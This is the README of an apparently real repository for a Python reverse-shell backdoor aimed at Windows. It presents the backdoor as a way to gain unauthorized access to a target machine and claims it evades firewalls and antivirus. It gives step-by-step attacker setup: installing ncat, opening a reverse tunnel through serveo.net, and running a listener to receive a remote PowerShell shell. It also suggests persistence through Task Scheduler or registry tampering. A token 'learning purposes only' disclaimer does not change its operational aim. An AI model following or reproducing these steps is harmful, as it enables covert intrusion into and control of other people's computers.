# Python Backdoor for Windows On Public Networks

This project is a Python-based Windows backdoor that, once executed on the target PC, establishes a connection to a remote server hosted on SERVEO at a specified TCP port. The server then forwards the connection to the attacker's system, successfully bridging communication between the attacker's machine and the target system. This connection grants unauthorized access to the target machine and provides a PowerShell command interface. Through this interface, the attacker can remotely execute PowerShell commands on the compromised system.
***The best part for this is that this will work even if the firewall and antivirus are running, because all the communications are happening through an ssh tunnel.***

- To get this to working a Tool must be installed on YOUR PC (attacker PC)

## Netcat installation
  
  To be able to receive and interpret incoming backdoor as a PowerShell command line we should use 'Netcat'. Netcat, also known as Ncat, is a powerful networking tool used for reading and writing to network connections using TCP or UDP protocols.
  ### For Linux:
  ```shell
 sudo apt install ncat
  ```
  - This one commad is enough to set up ncat on linux
### For windows:

  For WINDOWS Netcat comes With a networking tool called 'Nmap':
  - Go to Nmap official site https://nmap.org/download.html#windows
  - Download nmap installer and run it.
  - ***CHECK Ncat at this window***
 ![nmap_setup](https://github.com/user-attachments/assets/1916f804-be3e-4a5e-a362-b9f4b95439ce)
  - Continue the installation with default settings after this.
 
 ## SSH Server setup (serveo)
  As mentioned already In order to receive connections from a public network we must have a public server capable of doing these things, for that 'serveo' is the best option. (it's an open source project )
  - you can visit 'https://serveo.net' for more knowledge
  
  ```powershell
  ssh -R 61732:localhost:5555 serveo.net
  ```
 ![ssh](https://github.com/user-attachments/assets/5308fea9-6efd-4d16-81d9-fc1b6b8d749f)
  - This command will connect port 5555 on our local machine to port 61732 on the public server 'serveo' , any TCP port between range (49152–65535) will work, change the port no if not available.
  - ***Make sure the port number here (in this case 61732) is same as the port number on python code***

 ### REMINDER: you should keep a dedicated terminal open running this ssh command in order for this to work
 ## Ncat usage
 After Successfull installation you should see like this when you run the command 'ncat' :
 ![ncat_test](https://github.com/user-attachments/assets/d752e99b-ec2e-4722-b81d-2bce64bfe825)


 ```powershell
 ncat -lnvp 5555 #the same local port that you specified in ssh command
 ```
   Execute the command to start listening for connections :
  ![conn_try](https://github.com/user-attachments/assets/1b144bb1-fdf1-4fa2-ac68-e4cb376c30ce)


 While the python command is running on the target device connection will be established now you can start exceuting commands:
 ![final](https://github.com/user-attachments/assets/ba7bc1af-675e-4697-a9a5-be3f7be5749f)

- ***If the connection is stuck or not responding just close the current terminal open new one and run the same command the python code try try to reconnect every 120sec of inactivity (the time delay can be modified from the code)***
- ***Remember do not leave the terminal inactive, the connection will be lost since the python code try to reconnect***

 For Learning purposes only.
 

 You can configure the system to automatically startup the program on reboot.
 ON windows systems you can do this by using Task Scheduler or by tampering with registry.
 
 
 Try your best not to do anything ilegal :)
